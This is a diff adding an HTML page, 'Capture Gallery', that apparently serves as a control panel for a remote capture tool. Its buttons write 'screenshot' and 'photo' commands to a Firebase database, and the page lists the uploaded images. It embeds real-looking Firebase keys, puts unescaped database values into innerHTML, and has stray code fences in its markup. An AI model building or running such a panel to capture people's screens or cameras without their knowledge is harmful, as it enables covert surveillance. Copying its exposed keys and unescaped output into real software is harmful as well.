@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+<meta charset="UTF-8">
+<title>Capture Gallery</title>
+
+<style>
+
+*{
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
+
+body{
+    font-family:Arial,sans-serif;
+    background:#111;
+    color:white;
+    padding:20px;
+}
+
+h1{
+    text-align:center;
+    margin-bottom:25px;
+}
+
+.toolbar{
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    gap:12px;
+    margin-bottom:25px;
+    flex-wrap:wrap;
+}
+
+.toolbar input{
+    width:100px;
+    padding:10px;
+    border:none;
+    border-radius:6px;
+    background:#222;
+    color:white;
+    text-align:center;
+}
+
+.control-btn{
+    background:#00c3ff;
+    color:white;
+    border:none;
+    border-radius:6px;
+    padding:10px 18px;
+    cursor:pointer;
+}
+
+.control-btn:hover{
+    background:#009dd0;
+}
+
+.tabs{
+    display:flex;
+    justify-content:center;
+    gap:10px;
+    margin-bottom:25px;
+}
+
+.tab-btn{
+    width:auto;
+    background:#222;
+    color:white;
+    border:none;
+    border-radius:6px;
+    padding:12px 24px;
+    cursor:pointer;
+}
+
+.tab-btn.active{
+    background:#00c3ff;
+}
+
+.gallery{
+    display:flex;
+    flex-wrap:wrap;
+    gap:20px;
+}
+
+.card{
+    width:340px;
+    background:#1e1e1e;
+    border-radius:12px;
+    overflow:hidden;
+    box-shadow:0 0 15px rgba(0,0,0,.4);
+    transition:.25s;
+}
+
+.card:hover{
+    transform:translateY(-4px);
+}
+
+.card img{
+    width:100%;
+    height:220px;
+    object-fit:cover;
+    display:block;
+}
+
+.info{
+    padding:12px;
+}
+
+.date{
+    color:#bbb;
+    font-size:13px;
+    margin-bottom:12px;
+}
+
+.actions{
+    display:flex;
+    gap:10px;
+}
+
+.download-btn{
+    flex:1;
+    text-decoration:none;
+    text-align:center;
+    padding:10px;
+    background:#00a651;
+    color:white;
+    border-radius:6px;
+}
+
+.download-btn:hover{
+    background:#008b44;
+}
+
+.delete-btn{
+    flex:1;
+    border:none;
+    background:#d93025;
+    color:white;
+    border-radius:6px;
+    cursor:pointer;
+}
+
+.delete-btn:hover{
+    background:#b71c1c;
+}
+
+.empty{
+    color:#888;
+    font-size:18px;
+}
+
+.tab-content{
+    animation:fade .2s ease;
+}
+
+@keyframes fade{
+    from{opacity:0}
+    to{opacity:1}
+}
+
+</style>
+
+</head>
+
+<body>
+
+<h1>📸 Capture Gallery</h1>
+
+<div class="toolbar">
+
+```
+<input
+    type="number"
+    id="captureCount"
+    min="1"
+    value="1"
+>
+
+<button
+    id="screenshotBtn"
+    class="control-btn"
+>
+    📸 Take Screenshot
+</button>
+
+<button
+    id="photoBtn"
+    class="control-btn"
+>
+    📷 Take Photo
+</button>
+```
+
+</div>
+
+<div class="tabs">
+
+```
+<button
+    class="tab-btn active"
+    id="screenshotsTab"
+>
+    Screenshots
+</button>
+
+<button
+    class="tab-btn"
+    id="photosTab"
+>
+    Photos
+</button>
+```
+
+</div>
+
+<div
+    id="screenshots-section"
+    class="tab-content"
+>
+    <div
+        id="screenshots"
+        class="gallery"
+    ></div>
+</div>
+
+<div
+    id="photos-section"
+    class="tab-content"
+    style="display:none"
+>
+    <div
+        id="photos"
+        class="gallery"
+    ></div>
+</div>
+
+<script type="module">
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+
+import {
+    getDatabase,
+    ref,
+    onValue,
+    remove,
+    update
+}
+from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";
+
+const firebaseConfig = {
+    apiKey: "AIzaSyAsWsXapB3vh9_Gi-4jc6H1gkEbW8wcoxM",
+    authDomain: "YOUR_PROJECT.firebaseapp.com",
+    databaseURL: "https://server2-7ede6-default-rtdb.firebaseio.com",
+    projectId: "server2-7ede6",
+    storageBucket: "server2-7ede6.appspot.com",
+    messagingSenderId: "802078732237",
+    appId: "1:802078732237:web:b36a60573a998ac9ad1e84"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+
+const screenshotsDiv =
+document.getElementById("screenshots");
+
+const photosDiv =
+document.getElementById("photos");
+
+const screenshotsTab =
+document.getElementById("screenshotsTab");
+
+const photosTab =
+document.getElementById("photosTab");
+
+const screenshotsSection =
+document.getElementById("screenshots-section");
+
+const photosSection =
+document.getElementById("photos-section");
+
+screenshotsTab.onclick = () => {
+
+    screenshotsSection.style.display =
+    "block";
+
+    photosSection.style.display =
+    "none";
+
+    screenshotsTab.classList.add(
+    "active");
+
+    photosTab.classList.remove(
+    "active");
+
+};
+
+photosTab.onclick = () => {
+
+    screenshotsSection.style.display =
+    "none";
+
+    photosSection.style.display =
+    "block";
+
+    photosTab.classList.add(
+    "active");
+
+    screenshotsTab.classList.remove(
+    "active");
+
+};
+
+document
+.getElementById("screenshotBtn")
+.onclick = async () => {
+
+    const count =
+    Number(
+        document
+        .getElementById(
+        "captureCount"
+        ).value
+    ) || 1;
+
+    await update(
+        ref(db,"/"),
+        {
+            command:"screenshot",
+            count:count
+        }
+    );
+
+};
+
+document
+.getElementById("photoBtn")
+.onclick = async () => {
+
+    const count =
+    Number(
+        document
+        .getElementById(
+        "captureCount"
+        ).value
+    ) || 1;
+
+    await update(
+        ref(db,"/"),
+        {
+            command:"photo",
+            count:count
+        }
+    );
+
+};
+
+window.deleteCapture =
+async function(key){
+
+    try{
+
+        await remove(
+            ref(
+                db,
+                "captures/" + key
+            )
+        );
+
+    }catch(err){
+
+        console.error(err);
+
+    }
+
+};
+
+onValue(
+ref(db,"captures"),
+snapshot => {
+
+    screenshotsDiv.innerHTML = "";
+    photosDiv.innerHTML = "";
+
+    const data =
+    snapshot.val();
+
+    if(!data){
+
+        screenshotsDiv.innerHTML =
+        '<p class="empty">No screenshots found</p>';
+
+        photosDiv.innerHTML =
+        '<p class="empty">No photos found</p>';
+
+        return;
+    }
+
+    Object.entries(data)
+
+    .sort(
+        (a,b)=>
+        b[1].timestamp -
+        a[1].timestamp
+    )
+
+    .forEach(([key,item])=>{
+
+        const card =
+        document.createElement("div");
+
+        card.className = "card";
+
+        card.innerHTML = `
+
+        <a
+        href="viewer.html?url=${encodeURIComponent(item.url)}"
+        target="_blank">
+
+            <img
+            src="${item.url}"
+            loading="lazy">
+
+        </a>
+
+        <div class="info">
+
+            <div class="date">
+
+                ${new Date(
+                item.timestamp
+                ).toLocaleString()}
+
+            </div>
+
+            <div class="actions">
+
+                <a
+                href="${item.url}"
+                target="_blank"
+                class="download-btn">
+
+                Download
+
+                </a>
+
+                <button
+                class="delete-btn"
+                onclick="deleteCapture('${key}')">
+
+                Delete
+
+                </button>
+
+            </div>
+
+        </div>
+        `;
+
+        if(
+        item.type === "photo"
+        ){
+
+            photosDiv
+            .appendChild(card);
+
+        }else{
+
+            screenshotsDiv
+            .appendChild(card);
+
+        }
+
+    });
+
+});
+
+</script>
+
+</body>
+</html>
